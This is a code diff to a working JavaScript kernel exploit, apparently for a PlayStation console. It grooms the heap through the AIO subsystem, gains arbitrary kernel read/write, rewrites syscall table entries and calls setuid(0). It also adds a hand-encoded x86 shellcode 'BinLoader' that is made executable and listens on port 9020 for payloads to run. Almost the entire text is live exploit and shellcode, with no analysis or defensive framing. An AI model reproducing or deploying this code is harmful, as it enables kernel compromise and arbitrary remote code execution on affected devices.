@@ -96,9 +96,6 @@ const CPU_LEVEL_WHICH = 3;
 const CPU_WHICH_TID = 1;
 
 // sys/mman.h
-const PROT_READ = 1;
-const PROT_WRITE = 2;
-const PROT_EXEC = 4;
 const MAP_SHARED = 1;
 const MAP_FIXED = 0x10;
 
@@ -136,13 +133,15 @@ const main_core = 7;
 const num_grooms = 0x200;
 const num_handles = 0x100;
 const num_sds = 0x100; // max is 0x100 due to max IPV6_TCLASS
-const num_alias = 50; //TODO: check best value here for 9.xx
+const num_alias = 10;
 const num_races = 100;
 const leak_len = 16;
 const num_leaks = 5;
 const num_clobbers = 8;
 
 let chain = null;
+var nogc = [];
+
 async function init() {
     await rop.init();
     chain = new Chain();
@@ -1459,15 +1458,16 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
         die('pipe read failed');
     }
     log('achieved arbitrary kernel read/write');
-    
-    // RESTORE: clean corrupt pointers
-    // pktopts.ip6po_rthdr = NULL
-    const off_ip6po_rthdr = is_ps4 ? 0x68 : 0x70;
-    const r_rthdr_p = r_pktopts.add(off_ip6po_rthdr);
-    const w_rthdr_p = w_pktopts.add(off_ip6po_rthdr);
-    kmem.write64(r_rthdr_p, 0);
-    kmem.write64(w_rthdr_p, 0);
-    log('corrupt pointers cleaned');
+
+    // RESTORE: clean corrupt pointer
+     // pktopts.ip6po_rthdr = NULL
+     //ABC Patch
+     const off_ip6po_rthdr = 0x68;
+     const r_rthdr_p = r_pktopts.add(off_ip6po_rthdr);
+     const w_rthdr_p = w_pktopts.add(off_ip6po_rthdr);
+     kmem.write64(r_rthdr_p, 0);
+     kmem.write64(w_rthdr_p, 0);
+     log('corrupt pointers cleaned');
 
     /*
     // REMOVE once restore kernel is ready for production
@@ -1508,25 +1508,12 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     const sy_narg = kmem.read32(sysent_661);
     const sy_call = kmem.read64(sysent_661.add(8));
     const sy_thrcnt = kmem.read32(sysent_661.add(0x2c));
-
     // .sy_narg = 6
     kmem.write32(sysent_661, 6);
     // .sy_call = gadgets['jmp qword ptr [rsi]']
     kmem.write64(sysent_661.add(8), kbase.add(0x4c7ad));
     // .sy_thrcnt = SY_THR_STATIC
     kmem.write32(sysent_661.add(0x2c), 1);
-
-    log('change sys_execv() to sys_kexec()');
-
-    const offset_sysent_11 = 0x1100520;
-    const sysent_11 = kbase.add(offset_sysent_11);
-
-    // .sy_narg = 2
-    kmem.write32(sysent_11, 6);
-    // .sy_call = gadgets['jmp qword ptr [rsi]']
-    kmem.write64(sysent_11.add(8), kbase.add(0x4c7ad));
-    // .sy_thrcnt = SY_THR_STATIC
-    kmem.write32(sysent_11.add(0x2c), 1);
 
     log('add JIT capabilities');
     // TODO just set the bits for JIT privs
@@ -1610,7 +1597,6 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     log('setuid(0)');
     sysi('setuid', 0);
     log('kernel exploit succeeded!');
-
     log('restore sys_aio_submit()');
     kmem.write32(sysent_661, sy_narg);
     // .sy_call = gadgets['jmp qword ptr [rsi]']
@@ -1639,6 +1625,20 @@ function setup(block_fd) {
     }
     aio_submit_cmd(AIO_CMD_READ, reqs1.addr, num_workers, block_id.addr);
 
+    {
+        const reqs1 = make_reqs1(1);
+        const timo = new Word(1);
+        const id = new Word();
+        aio_submit_cmd(AIO_CMD_READ, reqs1.addr, 1, id.addr);
+        chain.do_syscall_clear_errno(
+            'aio_multi_wait', id.addr, 1, _aio_errors_p, 1, timo.addr);
+        const err = chain.errno;
+        if (err !== 60) { // ETIMEDOUT
+            die(`SceAIO system not blocked. errno: ${err}`);
+        }
+        free_aios(id.addr, 1);
+    }
+
     log('heap grooming');
     // chosen to maximize the number of 0x80 malloc allocs per submission
     const num_reqs = 3;
@@ -1649,6 +1649,48 @@ function setup(block_fd) {
     spray_aio(num_grooms, greqs.addr, num_reqs, groom_ids_p, false);
     cancel_aios(groom_ids_p, num_grooms);        
     return [block_id, groom_ids];
+}
+
+function runBinLoader() {
+    var payload_buffer = chain.sysp('mmap', 0x0, 0x300000, 0x7, 0x1000, 0xFFFFFFFF, 0);
+    var payload_loader = malloc32(0x1000);
+    var BLDR = payload_loader.backing;
+    BLDR[0]  = 0x56415741;  BLDR[1]  = 0x83485541;  BLDR[2]  = 0x894818EC;
+    BLDR[3]  = 0xC748243C;  BLDR[4]  = 0x10082444;  BLDR[5]  = 0x483C2302;
+    BLDR[6]  = 0x102444C7;  BLDR[7]  = 0x00000000;  BLDR[8]  = 0x000002BF;
+    BLDR[9]  = 0x0001BE00;  BLDR[10] = 0xD2310000;  BLDR[11] = 0x00009CE8;
+    BLDR[12] = 0xC7894100;  BLDR[13] = 0x8D48C789;  BLDR[14] = 0xBA082474;
+    BLDR[15] = 0x00000010; BLDR[16] = 0x000095E8;  BLDR[17] = 0xFF894400;
+    BLDR[18] = 0x000001BE; BLDR[19] = 0x0095E800;  BLDR[20] = 0x89440000;
+    BLDR[21] = 0x31F631FF; BLDR[22] = 0x0062E8D2;  BLDR[23] = 0x89410000;
+    BLDR[24] = 0x2C8B4CC6;  BLDR[25] = 0x45C64124;  BLDR[26] = 0x05EBC300;
+    BLDR[27] = 0x01499848; BLDR[28] = 0xF78944C5; BLDR[29] = 0xBAEE894C;
+    BLDR[30] = 0x00001000; BLDR[31] = 0x000025E8; BLDR[32] = 0x7FC08500;
+    BLDR[33] = 0xFF8944E7; BLDR[34] = 0x000026E8; BLDR[35] = 0xF7894400;
+    BLDR[36] = 0x00001EE8; BLDR[37] = 0x2414FF00; BLDR[38] = 0x18C48348;
+    BLDR[39] = 0x5E415D41; BLDR[40] = 0x31485F41; BLDR[41] = 0xC748C3C0;
+    BLDR[42] = 0x000003C0; BLDR[43] = 0xCA894900; BLDR[44] = 0x48C3050F;
+    BLDR[45] = 0x0006C0C7; BLDR[46] = 0x89490000; BLDR[47] = 0xC3050FCA;
+    BLDR[48] = 0x1EC0C748; BLDR[49] = 0x49000000; BLDR[50] = 0x050FCA89;
+    BLDR[51] = 0xC0C748C3; BLDR[52] = 0x00000061; BLDR[53] = 0x0FCA8949;
+    BLDR[54] = 0xC748C305; BLDR[55] = 0x000068C0; BLDR[56] = 0xCA894900;
+    BLDR[57] = 0x48C3050F; BLDR[58] = 0x006AC0C7; BLDR[59] = 0x89490000;
+    BLDR[60] = 0xC3050FCA;
+
+    chain.sys('mprotect', payload_loader, 0x4000, (0x1 | 0x2 | 0x4));
+
+    var pthread = malloc(0x10);
+    sysi('mlock', payload_buffer, 0x300000);
+
+    call_nze(
+        'pthread_create',
+        pthread,
+        0,
+        payload_loader,
+        payload_buffer
+    );
+
+    log('BinLoader is ready. Send a payload to port 9020 now');
 }
 
 // overview:
@@ -1667,10 +1709,16 @@ export async function kexploit() {
     await init();
     const _init_t2 = performance.now();
 
+    if(sessionStorage.getItem('binloader')){
+        runBinLoader();
+        return new Promise(() => {});
+    }
+
     // If setuid is successful, we dont need to run the kexploit again
     try {
         if (sysi('setuid', 0) == 0) {
-            log("Not running kexploit again.")
+            log("Not running kexploit again.");
+            runBinLoader();
             return;
         }
     }
@@ -1751,18 +1799,44 @@ export async function kexploit() {
     }
 }
 
+
+function malloc(sz) {
+    var backing = new Uint8Array(0x10000 + sz);
+    nogc.push(backing);
+    var ptr = mem.readp(mem.addrof(backing).add(0x10));
+    ptr.backing = backing;
+    return ptr;
+}
+
+function malloc32(sz) {
+    var backing = new Uint8Array(0x10000 + sz * 4);
+    nogc.push(backing);
+    var ptr = mem.readp(mem.addrof(backing).add(0x10));
+    ptr.backing = new Uint32Array(backing.buffer);
+    return ptr;
+}
+
+
 kexploit().then(() => {
-    var payload_loader = new View4(window.pld);
-    chain.sys('mprotect', payload_loader.addr, payload_loader.size, PROT_READ | PROT_WRITE | PROT_EXEC);
-    const ctx = new Buffer(0x10);
-    const pthread = new Pointer();
-    pthread.ctx = ctx;
+    
+    window.pld_size = new Int(0x26200000, 0x9);
+
+    var payload_buffer = chain.sysp('mmap', window.pld_size, 0x300000, 7, 0x41000, -1, 0);
+    var payload = window.pld;
+    var bufLen = payload.length * 4
+    var payload_loader = malloc32(bufLen);
+    var loader_writer = payload_loader.backing;
+    for (var i = 0; i < payload.length; i++) {
+        loader_writer[i] = payload[i];
+    }
+    chain.sys('mprotect', payload_loader, bufLen, (0x1 | 0x2 | 0x4));
+    var pthread = malloc(0x10);
 
     call_nze(
         'pthread_create',
-        pthread.addr,
+        pthread,
         0,
-        payload_loader.addr,
-        0,
+        payload_loader,
+        payload_buffer,
     );
 })
